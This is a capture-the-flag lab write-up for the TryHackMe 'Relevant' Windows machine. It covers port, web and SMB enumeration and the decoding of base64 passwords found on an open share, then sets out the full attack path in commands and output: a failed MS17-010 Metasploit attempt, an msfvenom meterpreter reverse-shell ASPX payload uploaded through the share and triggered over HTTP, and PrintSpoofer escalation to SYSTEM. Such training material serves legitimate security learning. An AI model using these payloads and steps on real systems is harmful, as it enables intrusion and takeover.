| [![Overpass](/_static/images/relevant.png)](https://tryhackme.com/room/relevant) |
|:--:|
| [https://tryhackme.com/room/relevant](https://tryhackme.com/room/relevant) |

# Relevant

A test of the ability to enumerate fully before exploiting. It teaches that the most seemingly obvious finding we 
see cannot always be exploited, and that we have to know when to quit and try something else. 

## Scanning

Run a simple port scan (without Ping)

	nmap -Pn -p- <IP target> -oN portscan

portscan:

```text
# Nmap 7.92 scan initiated Sun Oct  2 19:30:43 2022 as: nmap -Pn -p- -oN portscan <IP target>
Nmap scan report for <IP target>
Host is up (0.047s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

# Nmap done at Sun Oct  2 19:32:29 2022 -- 1 IP address (1 host up) scanned in 105.29 seconds
```

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p80,135,139,445,3389,49663,49667,49669 <IP target> -oN servicescan

servicescan:

```text
# Nmap 7.92 scan initiated Sun Oct  2 19:35:11 2022 as: nmap -Pn -T4 -A -p80,135,139,445,3389,49663,49667,49669 -oN servicescan <IP target>
Nmap scan report for <IP target>
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-10-01T18:23:23
|_Not valid after:  2023-04-02T18:23:23
|_ssl-date: 2022-10-02T18:36:56+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-02T18:36:17+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
| smb2-time: 
|   date: 2022-10-02T18:36:17
|_  start_date: 2022-10-02T18:23:43
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-02T11:36:20-07:00

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   43.72 ms 10.9.0.1
2   44.07 ms <IP target>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  2 19:36:56 2022 -- 1 IP address (1 host up) scanned in 105.97 seconds
```

## HTTP enumeration

    nikto -h http://<IP target>

Results:

```text
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          <IP target>
+ Target Hostname:    <IP target>
+ Target Port:        80
+ Start Time:         2022-10-02 19:39:32 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-10-02 19:48:51 (GMT1) (559 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Hidden files and directories

    gobuster dir -u http://<IP target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

Results:

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<IP target>
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/10/02 19:59:33 Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
...                                                  
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]                                                           
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]                                                           
                                                                                                           
===============================================================
2022/10/02 20:20:21 Finished
===============================================================
```

## SMB enumeration

    # smbclient -L //<IP target>
    do_connect: Connection to <IP target> failed (Error NT_STATUS_IO_TIMEOUT)

Nmap scan on ports 139 and 445 with all SMB enumeration scripts: 

```text
# nmap -p 139,445 -Pn --script smb-enum* <IP target>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 20:38 BST
Nmap scan report for <IP target>
Host is up (0.075s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\<IP target>\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\<IP target>\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\<IP target>\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\<IP target>\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-enum-sessions: 
|_  <nobody>

Nmap done: 1 IP address (1 host up) scanned in 44.41 seconds
```

Check for any known vulnerabilities within the SMB service:

```text
# nmap -p 139,445 -Pn --script smb-vuln* <IP target>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 20:40 BST
Nmap scan report for <IP target>
Host is up (0.042s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
```

Apparently, the machine is vulnerable to `MS17-010`, a remote code execution vulnerability in `SMBv1`.

Connecting to the `nt4wrksv` share:

    # smbclient //<IP target>/nt4wrksv
    Password for [WORKGROUP\root]:
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Sun Oct  2 20:39:00 2022
      ..                                  D        0  Sun Oct  2 20:39:00 2022
      passwords.txt                       A       98  Sat Jul 25 16:15:33 2020
    
            7735807 blocks of size 4096. 4936856 blocks available
    smb: \> get passwords.txt
    getting file \passwords.txt of size 98 as passwords.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

Back home, check it out:

    $ cat passwords.txt
    [User Passwords - Encoded]
    Qm9iIC0gIVBAJCRXMHJEITEyMw==
    QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

Are those base64-encoded credentials?

    $ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
    Bob - !P@$$W0rD!123                                                                                
    $ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
    Bill - Juw4nnaM4n420696969!$$$

## Exploiting SMB MS17-010

    $ searchsploit MS17-010                
    ---------------------------------------------- ---------------------------------
     Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    Microsoft Windows - 'EternalRomance'/'Eternal | windows/remote/43970.rb
    Microsoft Windows - SMB Remote Code Execution | windows/dos/41891.rb
    Microsoft Windows 7/2008 R2 - 'EternalBlue' S | windows/remote/42031.py
    Microsoft Windows 7/8.1/2008 R2/2012 R2/2016  | windows/remote/42315.py
    Microsoft Windows 8/8.1/2012 R2 (x64) - 'Eter | windows_x86-64/remote/42030.py
    Microsoft Windows Server 2008 R2 (x64) - 'Srv | windows_x86-64/remote/41987.py
    ---------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results

Mirroring:

    $ searchsploit -m windows/remote/43970.rb
      Exploit: Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)
          URL: https://www.exploit-db.com/exploits/43970
         Path: /usr/share/exploitdb/exploits/windows/remote/43970.rb
    File Type: Ruby script, ASCII text
    
    Copied to: /home/nina/43970.rb

Firing up Metasploit:

    msf6 > search MS17-010
    
    Matching Modules
    ================
    
       #  Name                                      Disclosure Date  Rank     Check  Description
       -  ----                                      ---------------  ----     -----  -----------
       0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
       1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
       2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
       3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
       4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
    
Trying 1:

    msf6 > use 1
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.9.1.53
    LHOST => 10.9.1.53
    msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 8888
    LPORT => 8888
    msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.201.108
    RHOSTS => 10.10.201.108
    msf6 exploit(windows/smb/ms17_010_psexec) > set SMBPass !P@$$W0rD!123
    SMBPass => !P@$$W0rD!123
    msf6 exploit(windows/smb/ms17_010_psexec) > set SMBUser Bob
    SMBUser => Bob
    msf6 exploit(windows/smb/ms17_010_psexec) > run

Results:

    [*] Started reverse TCP handler on 10.9.1.53:8888 
    [*] 10.10.201.108:445 - Authenticating to 10.10.201.108 as user 'Bob'...
    [-] 10.10.201.108:445 - Rex::ConnectionTimeout: The connection with (10.10.201.108:445) timed out.
    [*] Exploit completed, but no session was created.

Also tried other username (Bill), other shares, and the `auxilliary/admin/smb/ms17_010_command`. All timed out.
Researched possible causes, but kinda gave up on it. Too much of a rabbit hole. Will try another route.

## Exploiting HTTP on port 49663

    msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP attack> lport=4444 -f aspx -o shell.aspx

Connect to the network share and upload the reverse shell `.aspx` file: 

    # smbclient //<IP target>/nt4wrksv
    smb: \> put shell.aspx

Set up a listener:

    nc -nlvp 4444

Or set up mult-handler in Metasploit:

    # msfconsole -q
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
    msf6 exploit(multi/handler) > set lhost <IP attack>
    msf6 exploit(multi/handler) > set lport 4444
    msf6 exploit(multi/handler) > run

Access the `shell.aspx` file with `curl` or in browser:

    # curl http://<IP target>:49663/nt4wrksv/shell.aspx

    meterpreter > getuid

User flag:

    meterpreter > cat c:/users/bob/desktop/user.txt

## Privilege escalation

    meterpreter > getprivs

[Juicy Potato](https://github.com/ohpe/juicy-potato) does not work for Windows Server 2019 and Windows 10 versions 
1809 and higher, but using [PrintSpoofer](https://github.com/dievus/printspoofer) might work for 
abusing Impersonation Privileges .

Download PrintSpoofer from the Git repository to put it on the `nt4wrksv` SMB share to be transferred to the target 
machine:

    # wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe

    # smbclient //<IP target>/nt4wrksv     
    smb: \> put PrintSpoofer.exe       
                                   
Run:

    c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe

    PS C:\Windows\system32> whoami
    whoami
    nt authority\system

Root flag:

    PS C:\users\administrator\desktop> cat root.txt